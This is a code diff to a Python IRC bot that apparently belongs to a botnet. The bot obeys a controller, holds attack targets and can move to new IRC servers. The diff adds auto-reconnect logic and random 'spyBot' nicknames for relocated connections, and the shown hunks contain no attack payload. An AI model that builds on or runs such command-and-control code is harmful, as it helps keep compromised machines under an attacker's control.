@@ -31,6 +31,7 @@ class Bot():
         self.move_port = None
         self.move_channel = None
         self.move_socket = None
+        self.move_nickname = None
 
         # attack variables
         self.target_socket = None
@@ -79,7 +80,7 @@ class Bot():
     def __attempt_connection(self):
         '''
         '''
-        return self.__connect(self.move_socket, self.move_host, int(self.move_port), self.move_channel, self.nickname, None)
+        return self.__connect(self.move_socket, self.move_host, int(self.move_port), self.move_channel, self.move_nickname, None)
 
     def __connect_to_irc(self):
         '''
@@ -148,7 +149,7 @@ class Bot():
     def __handle_command(self, msg):
         _, cmd = msg.split(' :')
         cmd = cmd.split()
-        
+
         if cmd[0] == 'status':
             try:
                 self.__do_status()
@@ -239,6 +240,10 @@ class Bot():
                 self.irc_socket.close()
                 sys.exit()
                 return
+            if not msg:
+                log('Lost connection with server, reconnectiong...')
+                # reconnect
+                self.__connect_to_irc()
 
             if not self.__validate_msg(msg):
                 log('Warning: non-cotroller msg')
@@ -361,6 +366,7 @@ class Bot():
             self.__send_to_controller('move failed. Invalid port.')
             raise ValueError('Invalid port: {}'.format(port))
 
+        self.move_nickname = 'spyBot' + str(uuid.uuid4())
         self.move_channel = '#' + channel
         self.move_socket = self.__attempt_connection()
         if not self.move_socket:
